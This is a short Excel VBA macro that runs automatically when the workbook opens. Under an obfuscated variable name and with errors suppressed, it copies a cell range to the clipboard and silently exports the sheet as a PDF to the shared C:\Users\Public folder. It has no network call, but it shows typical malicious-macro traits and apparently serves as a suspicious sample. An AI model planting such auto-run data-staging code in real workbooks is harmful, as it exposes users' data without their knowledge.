Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim jybosg1pnivrj As Object
    On Error Resume Next
    Set jybosg1pnivrj = ActiveSheet.Range("A1:B10")
    jybosg1pnivrj.Copy
    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, _
        Filename:="C:\Users\Public\oblivionx_format.pdf"
End Sub
